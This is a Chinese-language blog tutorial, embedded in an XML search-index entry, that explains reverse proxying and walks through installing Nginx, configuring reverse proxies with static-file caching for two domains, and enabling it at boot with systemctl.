+    <content type="text"><![CDATA[Nginx是一款用C语言编写的高性能Web服务器，常常架设在其他Web服务的外层，用于负载均衡、缓存静态文件、反向代理等。所谓反向代理，就是部署在服务器端转发请求的代理服务，用户请求通过它到达真正的后端资源。与此对应的“正向”代理，是部署在客户端的代理服务，对外的网络请求实际由它发出。打个比方，正向代理就像是你叫你儿子帮你去打酱油，你儿子就是一个正向代理。反向代理就是你去酱油店买酱油，酱油实际上是老板找隔壁借来再卖给你，你并不知情，此时酱油店老板就是一个反向代理。从这个比方中也很好理解，正向代理对请求方是可知的，而反向代理对于请求方来说一般是透明的、不可知的。 安装Nginx使用Yum，我们可以很方便的安装Nginx(apt-get是完全类似的): yum install nginx 打开nginx的配置文件/etc/nginx/nginx.conf，长这样: # For more information on configuration, see:# * Official English Documentation: http://nginx.org/en/docs/# * Official Russian Documentation: http://nginx.org/ru/docs/user nginx;worker_processes auto;error_log /var/log/nginx/error.log;pid /run/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; log_format main '$remote_addr - $remote_user [$time_local] "$request" ' '$status $body_bytes_sent "$http_referer" ' '"$http_user_agent" "$http_x_forwarded_for"'; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; # Load modular configuration files from the /etc/nginx/conf.d directory. # See http://nginx.org/en/docs/ngx_core_module.html#include # for more information. include /etc/nginx/conf.d/*.conf; server &#123; listen 80 default_server; listen [::]:80 default_server; server_name _; root /usr/share/nginx/html; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / &#123; &#125; error_page 404 /404.html; location = /40x.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125;&#125; 配置反向代理在/etc/nginx/conf.d/目录下新建一个配置文件reverse_proxy.conf，输入以下内容: upstream wx_server &#123; server localhost:8001;&#125;proxy_temp_path /etc/nginx/proxy_temp;proxy_cache_path /etc/nginx/proxy_cache levels=1:2 keys_zone=cache_one:100m inactive=1d max_size=1g;server &#123; listen 80; server_name blog.hustlibraco.com hustlibraco.com; location ~ .*\.(gif|jpg|png|css|js|ico|swf)(.*) &#123; proxy_pass http://localhost:8000; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_cache cache_one; proxy_cache_valid 200 304 5m; proxy_cache_key $host$uri$is_args$args; expires 30d; &#125; location / &#123; proxy_pass http://localhost:8000; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; access_log /var/log/nginx/blog_hustlibraco_com_access.log;&#125;server &#123; listen 80; server_name wx.hustlibraco.com; location / &#123; proxy_pass http://wx_server; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; access_log /var/log/nginx/wx_hustlibraco_com_access.log;&#125; 其中两段server开头的配置指明了代理的规则，我们逐一解释下这些配置: listen 80监听80端口 server_name blog.hustlibraco.com hustlibraco.com接受这两个域名的请求 location ~ .\*\.(gif|jpg|png|css|js|ico|swf)(.\*){}指定文件的缓存配置 location / {}接受server_name下所有路径的请求 proxy_pass http://localhost:8000转发到localhost的8000端口上 proxy_pass http://wx_server转发到wx_server节点上，由upstream配置 proxy_redirect off不重写被代理服务器返回给客户端的Location和Refresh proxy_set_header Host $host设置请求头的Host为反向代理服务器的Host proxy_set_header X-Real-IP $remote_addr设置请求头的X-Real-IP为客户端真实IP proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for把请求来源的IP添加到请求头的X-Forwarded-For字段 X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项。 它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。 标准格式如下：X-Forwarded-For: client1, proxy1, proxy2。 access_log /var/log/nginx/blog_hustlibraco_com_access.log请求日志文件 了解这些配置项的意义之后，可以知道发送给blog.hustlibraco.com, hustlibraco.com的请求都会被转发到本地8000服务上，而发送给wx.hustlibraco.com的请求被转发到wx_server节点上（localhost:8001）。 配置好以后使用命令service nginx reload使配置生效。 设置开机自启动CentOS7引入了systemctl命令，结合了service和chkconfig的功能，一行命令设设置开机自启动: systemctl enable nginx.serviceln -s '/usr/lib/systemd/system/nginx.service' '/etc/systemd/system/multi-user.target.wants/nginx.service']]></content>
+      <categories>
+        <category>运维</category>
+        <category>Nginx</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Nginx</tag>
+      </tags>
+  </entry>
 </search>
